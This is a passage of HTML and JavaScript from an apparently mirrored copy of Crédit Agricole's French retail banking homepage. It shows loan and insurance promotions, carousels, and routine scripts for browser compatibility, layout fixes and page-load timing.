var compatibiliteNav = function() {
	 
	     
	     

		     if (NPC.informationNavigateur.partiellementCompatible) {
		         $("#bandeauNav").css("display", "block");
		         $("a.Header-login").css("display", "none");
		         $("a.HeaderSticky-login").css("display", "none");
	
		     } else if (NPC.informationNavigateur.incompatible) {
		         $("#pageNav").css("display", "block");
		     }
	     
	 
    
    $( ".croix-bandeau" ).on( "click", function() {
        $("#bandeauNav").addClass('hidden');
	});
 }

if(msie > 0) {
	if(window.attachEvent) {
    	window.attachEvent("onload", compatibiliteNav);
    } else {
		window.addEventListener("load", compatibiliteNav);
    }
} else {
    $( document ).ready(compatibiliteNav);
}
})();
</script></div>


</div>

		    		
		    		
		   		
		    
		    
		
	





<div id="inbenta" class="inbenta-interface hidden-print" data-cr="national" data-langue="fr" data-marche="particulier" data-univers-besoin="">
</div>

<div id="inbenta-compagnon-container" class="hidden-print" data-cr="national" data-langue="fr" data-marche="particulier" data-univers-besoin="">
    
</div>
<div id="tchat_session" class="hidden-print" data-value='{"genesysTchat": false}'>
    
</div>
		</header>
	
	<main tabindex="-1" id="main">
		










	
 

<div class="Template">
	<div class="container-fluid">
		<div class="row js-Template-head">
			
			<div class="col-xs-12 col-md-push-6 col-md-6">
			
				<h1 style="all: unset">
                    <div class="Breadcrumb Breadcrumb-homepage">
                       <div class="baliseTexteSimpleH1 texteSimple">






<div>
    
</div></div>

                    </div>
				</h1>
    			
			
				


				<div class="Template-splitMinHeight50 contexthub-mode-non-reconnu hidden">
					<div class="placeholder-2-1 parsys"><div class="push-projet parbase section">














	<div class="C012">
    	<div class="C012-content">
        	<img src="images/pictogramme/pictos-homepage/Planche-Pictox3-28-06-2108_Particulier.svg" alt=""/> 
        	<h2 style="text-transform:initial;"><h2>Achat immobilier, études, retraite, achat de voiture, déménagement…</h2></h2>
        	<a href="#liste-hub">Et vous quel est votre besoin ?</a>
    	</div>
	</div>

</div>

</div>

				</div>
				<div>
					<div class="placeholder-3 parsys"><div class="push-multiple parbase section">











	

	
		<div class="pushMultiple pushMultiple--container">
		
			
			    <p class="pushMultiple-title">
			    <span class="pushMultiple-title--bold"></span>
			    
			    <a href="#" class="pushMultiple-all" target="_self"></a>
			    </p>
			

			<ul class="pushMultiple-list js-pushMultiple">
				
                    <!-- Parametrage URL redirection -->
					
							

							
								
								
								
							
						
					<li class="pushMultiple-item" data-trackingClass ="avant_vente_page_Simulation_devis"
					data-tracking-conversion_avant_vente_nom="Simulateur Prêt immobilier"
					data-tracking-conversion_avant_vente_categorie="Simulateur"
					data-tracking-conversion_avant_vente_univers_de_besoin="emprunt">
                        

                        
                            
                            
                            
                                <div data-custom-redirect='{"url": "", "target": "_self"}' class="BlockLink" x-cq-linkchecker="valid" tabindex="-1" >
                                    <div class="BlockLink-cell BlockLink-cell--icon">
                                        <img class="BlockLink-icon" src="images/pictogramme/pictos-cp/simula.png" alt=""/>
                                    </div>
                                    <div class="BlockLink-cell">
                                        <p class="BlockLink-cat">Simulateur</p>

                                        <p class="BlockLink-title"><a href="#" target="_self">
                                            Simulateur Prêt immobilier</a></p>					

                                    </div>
                                </div>
                            
                        
					</li>
				
                    <!-- Parametrage URL redirection -->
					
							

							
								
								
								
							
						
					<li class="pushMultiple-item" data-trackingClass ="avant_vente_page_Simulation_devis"
					data-tracking-conversion_avant_vente_nom="Devis Assurance habitation"
					data-tracking-conversion_avant_vente_categorie="Devis"
					data-tracking-conversion_avant_vente_univers_de_besoin="assurance">
                        

                        
                            
                            
                            
                                <div data-custom-redirect='{"url": "#", "target": "_self"}' class="BlockLink" x-cq-linkchecker="valid" tabindex="-1" >
                                    <div class="BlockLink-cell BlockLink-cell--icon">
                                        <img class="BlockLink-icon" src="images/pictogramme/pictos-cp/Habitation.svg" alt=""/>
                                    </div>
                                    <div class="BlockLink-cell">
                                        <p class="BlockLink-cat">Devis</p>

                                        <p class="BlockLink-title"><a href="#" target="_self">
                                            Devis Assurance habitation</a></p>					

                                    </div>
                                </div>
                            
                        
					</li>
				
			</ul>
		</div>
	
</div>
<div class="push-multiple parbase section">











	

	
		<div class="pushMultiple pushMultiple--container">
		
			
			    <p class="pushMultiple-title">
			    <span class="pushMultiple-title--bold"></span>
			    
			    <a href="#" class="pushMultiple-all" target="_self"></a>
			    </p>
			

			<ul class="pushMultiple-list js-pushMultiple">
				
                    <!-- Parametrage URL redirection -->
					
							

							
								
								
								
							
						
					<li class="pushMultiple-item" data-trackingClass ="avant_vente_page_Simulation_devis"
					data-tracking-conversion_avant_vente_nom="Simulateur Crédit à la consommation"
					data-tracking-conversion_avant_vente_categorie="Simulateur"
					data-tracking-conversion_avant_vente_univers_de_besoin="emprunt">
                        

                        
                            
                            
                            
                                <div data-custom-redirect='{"url": "#", "target": "_self"}' class="BlockLink" x-cq-linkchecker="valid" tabindex="-1" >
                                    <div class="BlockLink-cell BlockLink-cell--icon">
                                        <img class="BlockLink-icon" src="images/pictogramme/pictos-cp/simul_auto.png" alt=""/>
                                    </div>
                                    <div class="BlockLink-cell">
                                        <p class="BlockLink-cat">Simulateur</p>

                                        <p class="BlockLink-title"><a href="#" target="_self">
                                            Simulateur Crédit à la consommation</a></p>					

                                    </div>
                                </div>
                            
                        
					</li>
				
                    <!-- Parametrage URL redirection -->
					
							

							
								
								
								
							
						
					<li class="pushMultiple-item" data-trackingClass ="avant_vente_page_Simulation_devis"
					data-tracking-conversion_avant_vente_nom="Devis Assurance auto"
					data-tracking-conversion_avant_vente_categorie="Devis"
					data-tracking-conversion_avant_vente_univers_de_besoin="assurance">
                        

                        
                            
                            
                            
                                <div data-custom-redirect='{"url": "#", "target": "_self"}' class="BlockLink" x-cq-linkchecker="valid" tabindex="-1" >
                                    <div class="BlockLink-cell BlockLink-cell--icon">
                                        <img class="BlockLink-icon" src="images/pictogramme/pictos-cp/Assurances.svg" alt=""/>
                                    </div>
                                    <div class="BlockLink-cell">
                                        <p class="BlockLink-cat">Devis</p>

                                        <p class="BlockLink-title"><a href="#" target="_self">
                                            Devis Assurance auto</a></p>					

                                    </div>
                                </div>
                            
                        
					</li>
				
			</ul>
		</div>
	
</div>
<div class="push-multiple parbase section">











	

	
		<div class="pushMultiple pushMultiple--container">
		
			
			    <p class="pushMultiple-title">
			    <span class="pushMultiple-title--bold"></span>
			    
			    <a href="#" class="pushMultiple-all" target="_self"></a>
			    </p>
			

			<ul class="pushMultiple-list js-pushMultiple">
				
                    <!-- Parametrage URL redirection -->
					
							

							
								
								
								
							
						
					<li class="pushMultiple-item" data-trackingClass ="avant_vente_page_Simulation_devis"
					data-tracking-conversion_avant_vente_nom="Simulateur Crédit auto"
					data-tracking-conversion_avant_vente_categorie="Simulateur"
					data-tracking-conversion_avant_vente_univers_de_besoin="emprunt">
                        

                        
                            
                            
                            
                                <div data-custom-redirect='{"url": "#", "target": "_self"}' class="BlockLink" x-cq-linkchecker="valid" tabindex="-1" >
                                    <div class="BlockLink-cell BlockLink-cell--icon">
                                        <img class="BlockLink-icon" src="images/pictogramme/pictos-cp/simul_auto.png" alt=""/>
                                    </div>
                                    <div class="BlockLink-cell">
                                        <p class="BlockLink-cat">Simulateur</p>

                                        <p class="BlockLink-title"><a href="#" target="_self">
                                            Simulateur Crédit auto</a></p>					

                                    </div>
                                </div>
                            
                        
					</li>
				
                    <!-- Parametrage URL redirection -->
					
							

							
								
								
								
							
						
					<li class="pushMultiple-item" data-trackingClass ="avant_vente_page_Simulation_devis"
					data-tracking-conversion_avant_vente_nom="Simulateur Crédit Travaux "
					data-tracking-conversion_avant_vente_categorie="Simulateur"
					data-tracking-conversion_avant_vente_univers_de_besoin="emprunt">
                        

                        
                            
                            
                            
                                <div data-custom-redirect='{"url": "#", "target": "_self"}' class="BlockLink" x-cq-linkchecker="valid" tabindex="-1" >
                                    <div class="BlockLink-cell BlockLink-cell--icon">
                                        <img class="BlockLink-icon" src="images/pictogramme/pictos-cp/simula.png" alt=""/>
                                    </div>
                                    <div class="BlockLink-cell">
                                        <p class="BlockLink-cat">Simulateur</p>

                                        <p class="BlockLink-title"><a href="#" target="_self">
                                            Simulateur Crédit Travaux </a></p>					

                                    </div>
                                </div>
                            
                        
					</li>
				
			</ul>
		</div>
	
</div>

</div>

				</div>
			</div>

			
			<div class="col-xs-12 col-md-6 col-md-pull-6">
				<div class="js-StickyPush">
					<div class="js-FullHeight row">
						<div class="placeholder-1 parsys"><div class="new-zdg parbase section">












    
    

<script>
    $(function () {


        window.ContextHub.eventing.on(ContextHub.SegmentEngine.PageInteraction.Teaser.prototype.info.loadEvent, function (event) {
            $(window).trigger('initCustomRedirect');
        });
        // Anomalie 351261 : il faut enlever la dernière <br> qui traine en fin de la zone de dialogue RTE
        // Pour garder que les 20px attendus entre la description et le bas de l'aplat
        $("div[class='PushCommunication-text']").find("p").each(function () {
            var inner = $(this)[0].innerHTML.trim();
            var brIfExist = inner.substr(inner.length - 4);
            var brAndNbspIfExist = inner.substr(inner.length - 11);
            if (brIfExist.indexOf("<br>") >= 0 || (brAndNbspIfExist.indexOf("<br>") >= 0 && brAndNbspIfExist.indexOf("&nbsp;") >= 0)) {
                setTimeout(removeLastBr, 1000, $(this));
            }
        });
        function removeLastBr(p) {
            $(p).find("br:last-child").remove();
        }
    });
</script>

    
        <div class="componentZdg">
            <div class="PushCarousel3">
                <div><button class="PushCarousel3-masking" onclick="toggleStateCarousel('hom')">Mettre en pause ou
                        redémarrer le défilement du carousel</button></div>
                <div class="PushCarousel3-carousel">
                    <div data-trackingclass="carrousel" class="PushCarousel3-carouselInner">
                        
                                

                            
                            <div class="PushCarousel3-item" data-trackinginfo="prognat_part-nbq_1">

                                <div class="PushCommunication-backgroundWrapper">
                                    <div class="PushCommunication-background PushCommunication-background--filterTransparent"
                                        style="background-image: url('images/nbq-fo-light/ouvrir-un-compte/nbq-zdg-animation-ouvrir-un-compte.png')">
                                    </div>
                                </div>
                                <div class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--primary">
                                    
                                    
                                        <div class="PushCommunication-title">
                                            <div class="texte section"><p><span class="RichText-titre3Blanc">VOUS SOUHAITEZ OUVRIR UN COMPTE
BANCAIRE AU CRÉDIT AGRICOLE ?</span></p>
</div>
                                        </div>
                                    
                                    <div class="PushCommunication-text">
                                        <div class="texte section">
                                            <p> Nous vous proposons d’y associer une de
nos 5 offres groupées de services, comprenant chacune
une carte bancaire et des services pour répondre à vos
besoins quotidiens.</p>

                                        </div>
                                    </div>
                                    
                                    	
                                    	
										<!-- Si la popin de co est activé -->
										
										<!-- Si la popin de co n'est pas activé -->
										
											
											<a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" target="_self"><span>DÉCOUVREZ NOS OFFRES</span></a>
										
										
										
                                </div>
                            </div>
                        
                                

                            
                            <div class="PushCarousel3-item" data-trackinginfo="defnat_euro-feminin_2">

                                <div class="PushCommunication-backgroundWrapper">
                                    <div class="PushCommunication-background PushCommunication-background--filterTransparent"
                                        style="background-image: url('images/zone/zdg-part-euro-feminin-2022.jpg')">
                                    </div>
                                </div>
                                <div class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--white">
                                    
                                    
                                        <div class="PushCommunication-title">
                                            <div class="texte section"><p><span class="h3">Derrière les Bleues, devant votre nouvel écran !</span></p>
</div>
                                        </div>
                                    
                                    <div class="PushCommunication-text">
                                        <div class="texte section">
                                            
                                        </div>
                                    </div>
                                    
                                    	
                                    	
										<!-- Si la popin de co est activé -->
										
										<!-- Si la popin de co n'est pas activé -->
										
											
											<a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" target="_self"><span>Simulez votre prêt personnel</span></a>
										
										
										
                                </div>
                            </div>
                        
                                

                            
                            <div class="PushCarousel3-item" data-trackinginfo="prognat_pret-immo_3">

                                <div class="PushCommunication-backgroundWrapper">
                                    <div class="PushCommunication-background PushCommunication-background--filterTransparent"
                                        style="background-image: url('images/zone/immo.jpg')">
                                    </div>
                                </div>
                                <div class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--white">
                                    
                                    
                                        <div class="PushCommunication-title">
                                            <div class="texte section"><p><span class="h3">TOUJOURS A VOS CÔTÉS POUR FAIRE AVANCER VOTRE PROJET IMMOBILIER</span><br />




















</p></div>
                                        </div>
                                    
                                    <div class="PushCommunication-text">
                                        <div class="texte section">
                                            <p>Le Crédit Agricole finance l’acquisition d’un logement sur quatre en France. Et si le prochain, c’était le vôtre.<br />


</p>
                                        </div>
                                    </div>
                                    
                                    	
                                    	
										<!-- Si la popin de co est activé -->
										
										<!-- Si la popin de co n'est pas activé -->
										
											
											<a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" target="_blank"><span>Accéder au simulateur.</span></a>
										
										
										
                                </div>
                            </div>
                        
                                

                            
                            <div class="PushCarousel3-item" data-trackinginfo="prognat_youzful-jeunes_4">

                                <div class="PushCommunication-backgroundWrapper">
                                    <div class="PushCommunication-background PushCommunication-background--filterTransparent"
                                        style="background-image: url('images/zone/JEUNES.jpg')">
                                    </div>
                                </div>
                                <div class="PushCommunication-zoning PushCommunication-zoning--bottomCenter PushCommunication-zoning--white">
                                    
                                    
                                        <div class="PushCommunication-title">
                                            <div class="texte section"><p><span class="h3">POUR CONSTRUIRE VOTRE AVENIR, CONNECTEZ-VOUS AUJOURD’HUI SUR LE BON RÉSEAU<br />




 </span></p></div>
                                        </div>
                                    
                                    <div class="PushCommunication-text">
                                        <div class="texte section">
                                            <p><span class="lead">Youzful, la plateforme pour s’informer, rencontrer des professionnels et trouver un job près de chez vous.<br />


 <span class="RichText-legal">Voir détail et conditions sur site</span></span></p>
                                        </div>
                                    </div>
                                    
                                    	
                                    	
										<!-- Si la popin de co est activé -->
										
										<!-- Si la popin de co n'est pas activé -->
										
											
											<a href="#" class="PushCommunication-btn PushCommunication-btn--primary" data-custom-redirect="#" target="_blank"><span>EN SAVOIR PLUS</span></a>
										
										
										
                                </div>
                            </div>
                        

                    </div>
                </div>
            </div>
        </div>
        <script>
            if (typeof sliderRelationalMessage === 'function') {
                sliderRelationalMessage();
            };
        </script>
    
    
    
    
    
	
</div>

</div>

					</div>
				</div>
			</div>
		</div>





<script>if (document.cookie.match('(^|; )id-part=([^;]*)')){ 	$('.contexthub-mode-reconnu').removeClass('hidden'); }else{	$('.contexthub-mode-non-reconnu').removeClass('hidden');}</script>

		<div class="Template-reduceMargin15px">
			<div class="placeholder-6 parsys"><div class="liste-hub parbase section">












	
	
		<div id="liste-hub" class="PushAccomp" id="C132"
			data-list-hub-images='["/images/zone/editorial/zdg-march%C3%A9s/HP%20PART%20C132_fond_1.jpg"]'>

			<div class="PushAccomp-content">

				<h2 class="Title PushAccomp-title"><p style="text-align: center;">LA BANQUE QUI <b>M'ACCOMPAGNE</b></p>
</h2>

				<div class="container">
					<div class="row Template-marginBot5perc">
						
							<div class="col-md-4">
								<div class="row">
									<div class="col-md-12 PushAccomp-contentTitle">
										
											
											
												<div class="h3" aria-hidden="true">&nbsp;</div>
											
										
									</div>
									
										<div class="col-md-12 PushAccomp-colMerge">
											<div class="PushAccomp-btn">
												
												<a href="#" class="PushAccomp-btnLink" target="_self">
													<div class="PushAccomp-contentSubtitle">Mes études</div>
													<div class="PushAccomp-contentArrow">
														<i class="icon npc-arrow-next"></i>
													</div>
												</a>
											</div>
										</div>
									
										<div class="col-md-12 PushAccomp-colMerge">
											<div class="PushAccomp-btn">
												
												<a href="#" class="PushAccomp-btnLink" target="_self">
													<div class="PushAccomp-contentSubtitle">Ma vie de famille</div>
													<div class="PushAccomp-contentArrow">
														<i class="icon npc-arrow-next"></i>
													</div>
												</a>
											</div>
										</div>
									
										<div class="col-md-12 PushAccomp-colMerge">
											<div class="PushAccomp-btn">
												
												<a href="#" class="PushAccomp-btnLink" target="_self">
													<div class="PushAccomp-contentSubtitle">Mon argent, mon patrimoine</div>
													<div class="PushAccomp-contentArrow">
														<i class="icon npc-arrow-next"></i>
													</div>
												</a>
											</div>
										</div>
									
								</div>
							</div>
						
							<div class="col-md-4">
								<div class="row">
									<div class="col-md-12 PushAccomp-contentTitle">
										
											
											
												<div class="h3" aria-hidden="true">&nbsp;</div>
											
										
									</div>
									
										<div class="col-md-12 PushAccomp-colMerge">
											<div class="PushAccomp-btn">
												
												<a href="#" class="PushAccomp-btnLink" target="_self">
													<div class="PushAccomp-contentSubtitle">Ma protection et celle de mes proches</div>
													<div class="PushAccomp-contentArrow">
														<i class="icon npc-arrow-next"></i>
													</div>
												</a>
											</div>
										</div>
									
										<div class="col-md-12 PushAccomp-colMerge">
											<div class="PushAccomp-btn">
												
												<a href="#" class="PushAccomp-btnLink" target="_self">
													<div class="PushAccomp-contentSubtitle">Ma retraite</div>
													<div class="PushAccomp-contentArrow">
														<i class="icon npc-arrow-next"></i>
													</div>
												</a>
											</div>
										</div>
									
										<div class="col-md-12 PushAccomp-colMerge">
											<div class="PushAccomp-btn">
												
												<a href="#" class="PushAccomp-btnLink" target="_self">
													<div class="PushAccomp-contentSubtitle">Mes coups durs</div>
													<div class="PushAccomp-contentArrow">
														<i class="icon npc-arrow-next"></i>
													</div>
												</a>
											</div>
										</div>
									
								</div>
							</div>
						
							<div class="col-md-4">
								<div class="row">
									<div class="col-md-12 PushAccomp-contentTitle">
										
											
											
												<div class="h3" aria-hidden="true">&nbsp;</div>
											
										
									</div>
									
										<div class="col-md-12 PushAccomp-colMerge">
											<div class="PushAccomp-btn">
												
												<a href="" class="PushAccomp-btnLink" target="_self">
													<div class="PushAccomp-contentSubtitle">Mon véhicule</div>
													<div class="PushAccomp-contentArrow">
														<i class="icon npc-arrow-next"></i>
													</div>
												</a>
											</div>
										</div>
									
										<div class="col-md-12 PushAccomp-colMerge">
											<div class="PushAccomp-btn">
												
												<a href="" class="PushAccomp-btnLink" target="_self">
													<div class="PushAccomp-contentSubtitle">Mon logement</div>
													<div class="PushAccomp-contentArrow">
														<i class="icon npc-arrow-next"></i>
													</div>
												</a>
											</div>
										</div>
									
										<div class="col-md-12 PushAccomp-colMerge">
											<div class="PushAccomp-btn">
												
												<a href="" class="PushAccomp-btnLink" target="_self">
													<div class="PushAccomp-contentSubtitle">Mon déménagement</div>
													<div class="PushAccomp-contentArrow">
														<i class="icon npc-arrow-next"></i>
													</div>
												</a>
											</div>
										</div>
									
								</div>
							</div>
						
					</div>

					<div class="PushAccomp-tips">
						
							<div class="PushAccomp-tipsPictoContainer">
								<div class="PushAccomp-tipsPicto">
									<img src="#" alt="" class="PushAccomp-tipsPictoImg"/>
								</div>
							</div>
						
						<div class="PushAccomp-tipsText"><p>Besoin d’informations ? Retrouvez les réponses aux questions que vous vous posez sur l’argent et même sur la vie. <a href=""><span class="RichText-texteBlanc">En savoir plus</span></a><br />
</p>
</div>
					</div>

				</div>
			</div>
		</div>
	

<script>
	var NPC = NPC || {};

	NPC.refreshListeHub = function() {
		$('div[data-list-hub-images]').each(
				function() {
					var $this = $(this);
					var imagesJson = $this.data('listHubImages');
					if (imagesJson.length !== 0) {
						var randomKey = Math
								.floor((Math.random() * imagesJson.length));
						var img = imagesJson[randomKey];
						$this.css('background-image', 'url(' + img + ')');
					}
				});
	};

	$(document).ready(function($) {
		NPC.refreshListeHub();
	});
</script></div>

</div>

		</div>

		<div class="row">
			<div class="col-xs-12 col-md-8">
				<div class="Template-reduceMargin15px">
					<div class="placeholder-7 parsys"><div class="citation parbase section">










<div class="Citation matchHeight" style="background-image:url(images/visuel2.jpg);">

	<div class="Citation-head">
		<h2 class="Citation-title">
			
				
			











    


    
    	<p>les engagements</p>
<p>de notre banque</p>

    
    
    


				
			
				
			
		</h2>
	</div>

	<figure class="Citation-content">
    	<blockquote class="Citation-text">
      		<div class="SimpleText">











    


    
    	Pouvoir compter sur sa banque 24h/24, être libre de changer d’avis, avoir confiance, voir sa fidélité reconnue…<br />

    
    
    

</div>

    	</blockquote>

    	<figcaption class="Citation-signature">
      		<div class="footerText texte">




<div tabindex="-1">
    
</div>
</div>

    	</figcaption>
	</figure>
	
</div>
</div>

</div>

				</div>
			</div>
			<div class="col-xs-12 col-md-4">
				<div class="Template-reduceMargin15px">
					<div class="placeholder-8 parsys"><div class="carousel-5-ecrans parbase section">












    
    
		
		<div class="PushCarousel5 matchHeight">
			<div>
				<button class="PushCarousel5-masking" onclick="toggleStateCarousel('carousel-engagement')">Mettre en pause ou redémarrer le défilement du carousel</button>
			</div>
			<div id="PushCarousel5-carousel" class="carousel slide PushCarousel5-carousel" data-ride="carousel" tabindex="0">
       	  		
                
                  
                      <ol class="carousel-indicators PushCarousel5-carouselIndicators">
                  
                  
               
		        	
					  	<li data-target="#PushCarousel5-carousel" data-slide-to="0" class="active"></li>
				  	
					  	<li data-target="#PushCarousel5-carousel" data-slide-to="1" class=""></li>
				  	
					  	<li data-target="#PushCarousel5-carousel" data-slide-to="2" class=""></li>
				  	
					  	<li data-target="#PushCarousel5-carousel" data-slide-to="3" class=""></li>
				  	
		        </ol>
		        <div class="carousel-inner PushCarousel5-carouselInner" role="listbox">
		        	
		        			
						  		
						  			<div class="item PushCarousel5-item active">
						  		
						  		
					  		
					  		<div class="carousel-caption PushCarousel5-carouselCaption">
			                	<span class="PushCarousel5-badge">1</span>
			                    <h2 class="PushCarousel5-text"><p><b>Charte des données personnelles</b></p>
<p>Au Crédit Agricole, nous prenons des engagements sur la protection des données de tous nos clients</p>
</h2>
			                    <div class="PushCarousel5-blockButton">
			                    	
			                        <a href="#" class="btn PushCarousel5-button" target="_self">EN SAVOIR PLUS</a>
			                    </div>
			                </div>
				  		</div>
		        	
		        			
						  		
						  		
						  			<div class="item PushCarousel5-item">
						  		
					  		
					  		<div class="carousel-caption PushCarousel5-carouselCaption">
			                	<span class="PushCarousel5-badge">2</span>
			                    <h2 class="PushCarousel5-text"><p><b>Les engagements relationnels&nbsp;</b></p>
<p>Nous souhaitons vous apporter la qualité de service qui vous donnera envie de rester chez nous<br>
</p>
</h2>
			                    <div class="PushCarousel5-blockButton">
			                    	
			                        <a href="" class="btn PushCarousel5-button" target="_self">EN SAVOIR PLUS</a>
			                    </div>
			                </div>
				  		</div>
		        	
		        			
						  		
						  		
						  			<div class="item PushCarousel5-item">
						  		
					  		
					  		<div class="carousel-caption PushCarousel5-carouselCaption">
			                	<span class="PushCarousel5-badge">3</span>
			                    <h2 class="PushCarousel5-text"><p><b>Point Passerelle</b></p>
<p>Nous accompagnons les clients dont l’équilibre financier et social se trouve déstabilisé par un événement<br>
</p>
</h2>
			                    <div class="PushCarousel5-blockButton">
			                    	
			                        <a href="" class="btn PushCarousel5-button" target="_self">EN SAVOIR PLUS</a>
			                    </div>
			                </div>
				  		</div>
		        	
		        			
						  		
						  		
						  			<div class="item PushCarousel5-item">
						  		
					  		
					  		<div class="carousel-caption PushCarousel5-carouselCaption">
			                	<span class="PushCarousel5-badge">4</span>
			                    <h2 class="PushCarousel5-text"><p><b>Le sport comme école de la vie</b></p>
<p>Parce que le sport est une école qui permet de se construire pour être plus fort, nous soutenons partout en France ceux qui font vivre le sport et ses valeurs</p>
</h2>
			                    <div class="PushCarousel5-blockButton">
			                    	
			                        <a href="" class="btn PushCarousel5-button" target="_self">EN SAVOIR PLUS</a>
			                    </div>
			                </div>
				  		</div>
		        	
		        </div>
	    	</div>
	    </div>
    

</div>

</div>

				</div>
			</div>
		</div>

		<div class="Template-reduceMargin15px">
			<div class="placeholder-9 parsys"><div class="push-page parbase section">





















<div class="PushPage">
	<div class="PushPage-head">
		<div class="h2"><h2><b>Une Banque Coopérative,</b> <b>c'est :&nbsp;</b></h2>
</div>
	</div>

    <div class="PushPage-main">
		    <div class="PushPage-items js-PushPage-items">
		    	<div class="PushPage-item">
        			<div class="PushPage-itemImageWrap">
          				<img class="PushPage-itemImage" src="images/pictogramme/pictos-homepage/Pictos-Ronds_PictoB-Particulier.svg" alt=""/>
        			</div>
       				 <div class="PushPage-itemTitle"><h3>Une banque qui rend&nbsp;<span class="h3"><b>votre épargne utile</b></span></h3>
</div>
      			</div>
      			<div class="PushPage-item">
        			<div class="PushPage-itemImageWrap">
          				<img class="PushPage-itemImage" src="images/pictogramme/pictos-homepage/Pictos-Ronds_PictoA-Particulier.svg" alt=""/>
        			</div>
       				 <div class="PushPage-itemTitle"><h3>Une banque qui <b>s’engage près de chez vous</b><br>
</h3>
</div>
      			</div>
      			<div class="PushPage-item">
        			<div class="PushPage-itemImageWrap">
          				<img class="PushPage-itemImage" src="images/pictogramme/pictos-homepage/Pictos-Ronds_PictoC-Particulier.svg" alt=""/>
        			</div>
       				 <div class="PushPage-itemTitle"><h3>Une banque qui <b>dynamise l’économie locale</b><br>
</h3>
</div>
      			</div>
		</div>
	</div>
	
	
	    <div class="PushPage-bottom">
	        <a id="urlEspaceSocietaire" href="" class="btn PushPage-button" target="_self">
	        	Découvrez votre espace sociétaire
	        </a>
	    </div>
	
</div></div>

</div>

		</div>

		<div class="row Template-backgroundBrandGray01">
			<div class="col-xs-12">
				<div class="Template-reduceMargin15px text-center">
					<div class="placeholder-10 parsys"><div class="texte section">





		<div class="row Template-backgroundBrandGray01">
			<div class="placeholder-11 parsys"><div class="owl-carousel CarouselActu js-carouselActu section">

	
		
        
			<div class="PushActu matchHeight" data-custom-redirect="">
        
	
		
			<script>
				window.parent.magPushActu_resourceType = "ca/npc/components/pages/accueil-banque-privee";
				var global_magPushActu_wcmMode = "DISABLED";
				window.parent.magPushActu_currentPagePath = "/content/ca/national/npc/fr/particulier";
			</script>
		
		
			
	        
				<div class="PushActu-imageWrapper" style="background-image: url('images/mag/images-d%c3%a9coratives/part/comment-financer-un-investissement-immobilier/comment-financer-un-investissement-immobilier-paysage.jpg')" aria-hidden="true">
	        
        
			<img class="PushActu-image" src="images/mag/images-d%c3%83%c2%a9coratives/part/comment-financer-un-investissement-immobilier/comment-financer-un-investissement-immobilier-paysage.html" alt="Image blog" aria-hidden="true"/>
			
		</div>
		
			
	        
	        	
	 
	
		
        
			


			<div class="col-xs-12 col-md-4">
				<div class="placeholder-14 parsys"><div class="sur-footer-sos parbase section">














    
    
	<div class=" sur-footer-sos-inner-div matchHeight" data-class="">
	
        <div class="PushNeedHelp">
            <div class="row PushNeedHelp-row">
            	<div class="col-md-12 col-xs-4 PushNeedHelp-blockImage ">
                	<div class="PushNeedHelp-image">
                 		<img src="images/pictogramme/pictos-homepage/surfooter/Picto-PART-Aide.svg" alt=""/>
                	</div>	               
               	</div>
                <div class="col-md-12 col-xs-8 PushNeedHelp-content">
                    <div class="PushNeedHelp-blockTitle" target="">
                        <p class="PushNeedHelp-title h4">BESOIN D&#39;AIDE ?</p>
                    </div>
                    <div class="PushNeedHelp-text"><p>Opposition sur votre carte bancaire, question concernant vos solutions... Retrouvez toutes nos informations de contacts</p>

</div>
                    
                    <a href="#" class="PushNeedHelp-link" target="_self">Contactez-nous</a>
                </div>
            </div>
        </div>
    </div>


<script>
	if (NPC && typeof NPC.injectDataClassToParent === "function") {
		NPC.injectDataClassToParent();
	}
</script></div>

</div>

			</div>
			<div class="col-xs-12 col-md-4">
				<div class="placeholder-15 parsys"><div class="sur-footer-store-apps-ca parbase section">











<div class="AppStoreCA sur-footer-store-apps-ca-inner-div " data-class="">
	<div class="row AppStoreCA-row">
		<div class="col-md-12 col-xs-4 AppStoreCA-image">
			<div class="pictogramme image parbase">











    
        <div class="">
            <img src="images/pictogramme/pictos-homepage/surfooter/Picto-PART-Appli.svg" alt=""/>
        </div>
    
    
</div>

		</div>
		

<script>
	if (NPC && typeof NPC.injectDataClassToParent === "function") {
		NPC.injectDataClassToParent();
	}
</script></div>

</div>

			</div>
		</div>
		<div class="row row-no-padding">
			<div class="col-xs-12">
				<div class="placeholder-sur-footer parsys">
</div>

			</div>
		</div>
	</div>
	

	<script>

	$( window ).load(function() {
		
		//Echantillonage de 1%
		var frequence = 100;
		if (Math.floor(Math.random()*(frequence+1))===frequence) {
			
			var start = window.performance.timing.fetchStart;
			var stop = window.performance.timing.loadEventStart;
			
			if(start && stop && start > 0 && stop > 0)	{

				var timing = (stop-start);
				//on vérifie si la valeur de timinig n'est pas null ou inférieur à 0 ou superieur à 30 min
				if (!timing || timing < 0 || timing > 1000*60*30 ) {
					NPC.clientSideLogger.error('PERFORMANCE', 'La valeur de temps de chargement de la page est invalide, timing: '+ timing  );
					return;
				}		
				var data = {};
				data.kpi=timing;

	      		$.ajax({
	          		type: "POST",
	          		url: NPC.genererURLJson("vitrine.kpi"),
	         		data: data,
	          		success: function () {
	        	  	//Rien à faire
	          		},
	         		error: function () {
	        	  	//Permissif, rien a faire
	          		}
	        	});
			}else {
				NPC.clientSideLogger.error('PERFORMANCE', 'Echec de récupération des données fetchStart-loadEventStart, fetchStart: ' + start + ' - loadEventStart: ' + stop );
			}
		}
		
		// Anomalie 354342 : il faut éliminer les margin/padding lorsque le composant a été ajouté mais n'a pas été contribué
		var contenuContributionPlaceholder4AvantTrim = $("div.placeholder-4 > div > div").html();
		if (typeof contenuContributionPlaceholder4AvantTrim != 'undefined') {
			var contenuContributionPlaceholder4 = contenuContributionPlaceholder4AvantTrim.trim();
	        if (contenuContributionPlaceholder4.length == 0 || contenuContributionPlaceholder4 == ""){
	        	$("div.placeholder-4 > div").css({"margin": "0","padding": "0"});
	        }
		}
	});

	</script>
	
</div>
	</main>

	
	<script>
        
        var NPC = NPC || {};
    </script>

	
		<footer>
			
		    <div class="Footer">
				









	











<div class="TopFooterSocial">
	
		
			
				<div class="push-to-social parsys"><span class="button-facebook button-template section">










<a href="#" target="_blank" class="TopFooterSocial-Links" aria-label="aller sur la page Facebook" data-trackingclass="Clic-Facebook">
    <span class="TopFooterSocial-imgSocial icon">
